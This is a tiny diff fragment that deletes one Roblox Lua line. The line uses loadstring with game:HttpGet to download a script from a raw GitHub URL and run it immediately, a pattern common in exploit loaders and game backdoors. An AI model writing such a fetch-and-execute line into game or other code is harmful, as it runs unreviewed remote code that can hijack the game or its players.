@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iliekmen/i-liek-men-project/main/asdadawd"))()
